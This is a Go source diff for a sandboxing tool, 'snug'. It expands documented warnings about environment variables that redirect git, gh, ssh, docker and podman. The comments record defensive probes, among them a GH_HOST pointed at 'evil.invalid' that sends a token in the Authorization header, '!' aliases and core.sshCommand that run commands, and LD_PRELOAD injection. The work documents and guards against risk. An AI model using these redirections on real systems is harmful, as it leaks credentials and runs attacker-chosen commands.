@@ -718,8 +718,11 @@ func (n envNote) forVerb(verb EnvVerb) string {
 //
 //   - a profile snug SHIPS may still write only a rostered name
 //     (internal/profile's checkBuiltinEnvRoster), and none of these names has a
-//     roster row unless it is listed in envTypes above;
-//   - checkEnvOwnership still refuses snug's own scalars to everybody;
+//     roster row unless it is listed in envTypes above, and never a name snug
+//     fills itself when a feature is on (conditionalEnvs);
+//   - checkEnvOwnership still refuses snug's own scalars to everybody, and
+//     checkConditionalEnv refuses the conditional ones in a selection that
+//     turns their feature on;
 //   - the type rules still refuse an operation snug cannot perform correctly.
 //
 // PS1 is deliberately absent, and so is SNUG*: they are snug's own (§1.1) and
@@ -747,9 +750,9 @@ var envNotes = map[string]envNote{
 	//
 	//	LD_PRELOAD=$W/libpre.so /bin/echo hi  -> LD-PRELOAD-RAN, then hi
 	//	                        /bin/echo hi  -> hi              (control)
-	// The socket-activation pair snug authors for @http-proxy. Rows exist because
-	// a name with none renders "unchecked: snug has no type for this name" — a
-	// true statement about a profile's value and a false one about snug's own.
+	// The socket-activation pair snug authors for listen_names. A profile may
+	// write either in a selection with no listen_names (conditionalEnvs), so the
+	// sentences are about what a server does with the value, not about snug's.
 	//
 	// shapeOpaque for both: a count and a colon-separated name list, neither of
 	// them a path. What they DO is hand a descriptor over, and the descriptor is
@@ -761,12 +764,11 @@ var envNotes = map[string]envNote{
 	// bwrap closes only the descriptors it consumes. The end-to-end path through
 	// snug is asserted by the integration test named at HTTPDoorShimPath's
 	// caller, not by this row.
-	"LISTEN_FDS": both(shapeOpaque, "tells the payload how many listening descriptors snug handed it "+
-		"at fd 3.. — the door(s) a human may open with `snug proxy` (measured: the descriptor "+
-		"arrives at fd 3 with acceptconn=1)"),
-	"LISTEN_FDNAMES": both(shapeOpaque, "names those descriptors, colon-separated and in the same "+
-		"order, so a payload with more than one door can tell them apart (measured alongside "+
-		"LISTEN_FDS)"),
+	"LISTEN_FDS": both(shapeOpaque, "a socket-activated server takes this many listening descriptors "+
+		"from fd 3 on as its own; listen_names makes snug write it with the descriptors behind it "+
+		"(measured: the descriptor arrives at fd 3 with acceptconn=1)"),
+	"LISTEN_FDNAMES": both(shapeOpaque, "names the descriptors LISTEN_FDS counts, colon-separated and in "+
+		"order; listen_names makes snug write it (measured alongside LISTEN_FDS)"),
 	"LD_PRELOAD": both(shapePath, "every process in the sandbox loads this library before its own code "+
 		"(measured, glibc 2.43, with the control)"),
 	// Measured, glibc 2.43, with the control. An audit library needs only
@@ -1434,12 +1436,11 @@ var envNotes = map[string]envNote{
 	// disclosure a reader needs in order to aim it somewhere the payload cannot
 	// write. Aim it at a directory the profile authored.
 	//
-	// GIT_CONFIG_GLOBAL and GH_CONFIG_DIR are pointers too and are deliberately
-	// ABSENT: they are in SnugOwnedEnv, so no profile reaches them at any verb,
-	// and this table's rule is that snug's own names stay out of it — a row here
-	// invites someone to read it as permission. testdata/annotations.txt renders
-	// them as "(no profile may write this name)" so the artifact still accounts
-	// for every pointer.
+	// GIT_CONFIG_GLOBAL and GH_CONFIG_DIR are pointers snug fills itself when
+	// the selection turns on the feature behind them (conditionalEnvs), and a
+	// profile may write them in any other selection — so they carry sentences
+	// like every writable pointer. Pointed under {target}, either one names a
+	// file the repository wrote, which is a command table the payload chose.
 	//
 	// The XDG four and XDG_RUNTIME_DIR carry NO `authored` sentence, and that is
 	// a decision with a measurement behind it rather than an omission — issue
@@ -1513,6 +1514,111 @@ var envNotes = map[string]envNote{
 		host: "taking the host's value points docker back at the host's config, credentials " +
 			"included; `set` it to a path a profile authored",
 	},
+	// The names snug fills itself when a profile key turns a feature on
+	// (conditionalEnvs). A profile writing one is refused in a selection that
+	// turns the feature on, so every sentence here is about a run where snug's
+	// narrowed mechanism is absent and the profile's value is the whole grant.
+	//
+	// Measured on the host, git 2.55.0, with the control — a file holding
+	// `[alias] probe = "!echo GCG-ALIAS-RAN"` and `core.sshCommand = "echo …"`:
+	//
+	//	GIT_CONFIG_GLOBAL=g.conf git probe          -> GCG-ALIAS-RAN
+	//	                         git probe          -> 'probe' is not a git command (control)
+	//	GIT_CONFIG_GLOBAL=g.conf git ls-remote git@example.invalid:x/y
+	//	                                            -> fatal: protocol error: bad line length
+	//	                                               character: GCG-   (the echo WAS the transport)
+	"GIT_CONFIG_GLOBAL": {shape: shapePath,
+		authored: "git reads this file in place of ~/.gitconfig, and an alias `!cmd` or core.sshCommand " +
+			"in it is a command git runs (measured, git 2.55.0)",
+		host: "taking the host's value points git back at the host's global config, credential " +
+			"helpers included; `set` it to a path a profile authored",
+	},
+	// Measured on the host, gh 2.96.0, with the control — config.yml holding
+	// `aliases: {probe: "!echo GH-ALIAS-RAN"}`:
+	//
+	//	GH_CONFIG_DIR=d  gh probe  -> GH-ALIAS-RAN
+	//	GH_CONFIG_DIR=d2 gh probe  -> unknown command "probe" for "gh"   (control)
+	"GH_CONFIG_DIR": {shape: shapePath,
+		authored: "gh reads its tokens from hosts.yml in this directory, and a `!` alias in its " +
+			"config.yml is a shell command gh runs (measured, gh 2.96.0)",
+		host: "taking the host's value points gh back at the host's config, tokens included; " +
+			"identity.gh.user mints one token for one account instead",
+	},
+	// Measured on the host, gh 2.96.0, GH_DEBUG=api, hosts.yml holding a fake
+	// token for evil.invalid:
+	//
+	//	GH_HOST=evil.invalid gh api user  -> > Host: evil.invalid
+	//	                                     > Authorization: token ████
+	"GH_HOST": both(shapeOpaque, "the host gh sends its requests to, with the token hosts.yml holds for "+
+		"that host in the Authorization header (measured, gh 2.96.0)"),
+	// Measured on the host: `ssh-add -l` against the desktop agent lists every
+	// key it holds, and an agent signs with any key it lists.
+	"SSH_AUTH_SOCK": {shape: shapePath,
+		authored: "ssh offers and signs with every key the agent at this socket holds (measured: " +
+			"ssh-add -l lists them all); identity.ssh.agent = \"proxy\" pins one key instead",
+		host: "the host's agent socket signs with every key it holds (measured: ssh-add -l lists " +
+			"them all), and exists inside only if a profile binds it; identity.ssh.agent = " +
+			"\"proxy\" pins one key instead",
+	},
+	// DOCKER, NOT PODMAN. Measured on the host, podman 6.0.2: `podman --remote
+	// info` with DOCKER_HOST=unix:///nonexistent/d.sock succeeded against the
+	// default socket, so podman does not read this name. What reads it is the
+	// docker client and the compat-API libraries. DOCUMENTED, NOT MEASURED ON
+	// THIS HOST: that docker's client runs the `ssh` binary for an ssh:// URL
+	// (docker's own docs, "Protect the Docker daemon socket" / docker context).
+	// Tried: no docker client is installed on the host this was written on.
+	"DOCKER_HOST": both(shapeOpaque, "the docker client and the compat-API libraries send every request "+
+		"to the engine at this URL, which runs whatever container they ask for, mounts included; "+
+		"podman = \"socket\" puts snug's filtering proxy here instead"),
+	// Measured on the host, podman 6.0.2, with a stub `ssh` first on PATH that
+	// logs its argv:
+	//
+	//	CONTAINER_HOST=ssh://u@127.0.0.1:1/run/x.sock podman --remote info
+	//	  -> dial tcp 127.0.0.1:1: connect: connection refused; the stub never ran
+	//
+	// So podman dials the ssh URL ITSELF rather than exec'ing ssh — the design's
+	// "ssh:// makes the client exec ssh" is docker's behaviour, not podman's.
+	"CONTAINER_HOST": both(shapeOpaque, "podman's client sends every request to the engine at this URL, "+
+		"which runs whatever container it asks for, mounts included, and it dials an ssh:// URL "+
+		"itself (measured, podman 6.0.2); podman = \"socket\" puts snug's filtering proxy here instead"),
+	// DOCUMENTED, NOT MEASURED ON THIS HOST: the BuildKit session is described
+	// at containerEnv (internal/cli/container.go), from docker's documentation.
+	// Tried: no docker client is installed on the host this was written on.
+	"DOCKER_BUILDKIT": both(shapeOpaque, "1 makes `docker build` boot a BuildKit builder and negotiate "+
+		"mounts over a session snug's proxy does not inspect; podman = \"socket\" writes 0"),
+	// Names snug does NOT write that the tool reads IN PLACE OF one snug does
+	// (conditionalEnvs' `outranks`). Measured on the host, gh 2.96.0, with a
+	// hosts.yml holding PINNEDTOKEN for github.com, then PINNEDGHE for a GHE host:
+	//
+	//	GH_CONFIG_DIR=d                     gh auth token  -> PINNEDTOKEN  (control)
+	//	GH_TOKEN=OTHER     GH_CONFIG_DIR=d  gh auth token  -> OTHER
+	//	GITHUB_TOKEN=GHTOK GH_CONFIG_DIR=d  gh auth token  -> GHTOK
+	//	GH_HOST=ghe GH_ENTERPRISE_TOKEN=ENT      ...       -> ENT   (control PINNEDGHE)
+	//	GH_HOST=ghe GITHUB_ENTERPRISE_TOKEN=GENT ...       -> GENT
+	"GH_TOKEN": both(shapeOpaque, "gh uses this token for github.com in place of the one in hosts.yml, "+
+		"so it decides which account gh acts as (measured, gh 2.96.0)"),
+	"GITHUB_TOKEN": both(shapeOpaque, "gh uses this token for github.com in place of the one in "+
+		"hosts.yml, so it decides which account gh acts as (measured, gh 2.96.0)"),
+	"GH_ENTERPRISE_TOKEN": both(shapeOpaque, "gh uses this token for an Enterprise host in place of the "+
+		"one in hosts.yml, so it decides which account gh acts as there (measured, gh 2.96.0)"),
+	"GITHUB_ENTERPRISE_TOKEN": both(shapeOpaque, "gh uses this token for an Enterprise host in place of "+
+		"the one in hosts.yml, so it decides which account gh acts as there (measured, gh 2.96.0)"),
+	// Measured on the host, podman 6.0.2, CONTAINERS_CONF naming a connection
+	// "evil" at unix:///nonexistent/b.sock:
+	//
+	//	CONTAINER_HOST=…/a.sock CONTAINER_CONNECTION=evil podman --remote info -> dials b.sock
+	//	CONTAINER_HOST=…/a.sock                           podman --remote info -> dials a.sock (control)
+	"CONTAINER_CONNECTION": both(shapeOpaque, "podman talks to the named connection from its "+
+		"containers.conf in place of CONTAINER_HOST (measured, podman 6.0.2), so it decides which "+
+		"engine runs the payload's containers"),
+	// DOCUMENTED, NOT MEASURED ON THIS HOST: sd_listen_fds(3) — a server takes
+	// the LISTEN_FDS descriptors only when LISTEN_PID is its own pid. Tried:
+	// no sd_listen_fds consumer on the host. What WAS measured, by the #621
+	// red-team round: a profile's LISTEN_PID=1 beside listen_names rendered on
+	// --dry-run and reached the payload as its own pid, because the staged
+	// script (httpDoorShim) exports it after bwrap's --setenv.
+	"LISTEN_PID": both(shapeOpaque, "a socket-activated server takes the LISTEN_FDS descriptors only "+
+		"if this is its own pid; listen_names makes snug's staged script export it"),
 	// MEASURED INSIDE A RUNNING SANDBOX — redteam host round 2, which is also the
 	// round that upgraded this row from "documented". /usr/bin/npm is still the
 	// broken libalternatives shim on this host ("npm-default: No such file or
@@ -1734,10 +1840,8 @@ var envNotePrefixes = []struct {
 		// GIT_CONFIG_GLOBAL and GIT_CONFIG_SYSTEM are POINTERS at a config FILE,
 		// which is the mechanism, not the hazard — the same carve-out CARGO_HOME
 		// and NPM_CONFIG_USERCONFIG have, and the same one inlineConfigPointers
-		// makes for these two names. GIT_CONFIG_GLOBAL is also in SnugOwnedEnv, so
-		// no profile reaches it at any verb; GIT_CONFIG_SYSTEM is not, and a
-		// profile pointing git's system scope at a file it authored is doing the
-		// thing "generate, don't bind" asks for.
+		// makes for these two names. A profile pointing either at a file it
+		// authored is doing the thing "generate, don't bind" asks for.
 		//
 		// The two tables' exemption sets are now identical, and that is asserted
 		// rather than asked for: TestPointerExemptionsAgreeBetweenTheTwoTables.
@@ -1837,12 +1941,11 @@ var inlineConfigPointers = []inlineConfigPointer{
 	{"CARGO_HOME", "CARGO_"},
 	// No family — and the two differ in a way worth reading, because assuming
 	// they were the same is how DOCKER_CONFIG would have been skipped again.
-	// GH_CONFIG_DIR is in SnugOwnedEnv, so no profile reaches it at any verb and
-	// it carries no annotation (snug's own names stay out of that table).
-	// DOCKER_CONFIG is NOT owned: it has a roster row, any profile may `set` it,
-	// and it names a directory whose config.json `credsStore` is a program
-	// docker executes — so it carries an `authored` sentence like every other
-	// writable pointer.
+	// GH_CONFIG_DIR has no roster row and a profile may write it only in a
+	// selection with no identity.gh.user (conditionalEnvs); DOCKER_CONFIG has a
+	// row and any profile may `set` it. Both name a directory holding a program
+	// the tool executes or a token it sends, so both carry an `authored`
+	// sentence like every other writable pointer.
 	{"DOCKER_CONFIG", ""},
 	{"GH_CONFIG_DIR", ""},
 }
@@ -2231,9 +2334,11 @@ func checkEnvOwnership(name string, verb EnvVerb) error {
 		}
 		return fmt.Errorf("environ.%s names %s, which snug writes itself. No profile may "+
 			"write a name snug writes: HOME, PATH and SHELL have no safe absent state, "+
-			"PS1 is executed by bash, and SNUG* is what --dry-run is read against — a "+
+			"PS1 is executed by bash, SNUG* is what --dry-run is read against — a "+
 			"profile that could set one could lie to the artifact a human reads to decide "+
-			"whether to trust the sandbox. Remove the line", verb, name)
+			"whether to trust the sandbox — and TERM, LANG and TZ come from the host, so "+
+			"refusing them only where the host has one would make the verdict depend on "+
+			"the host. Remove the line", verb, name)
 	}
 	return nil
 }
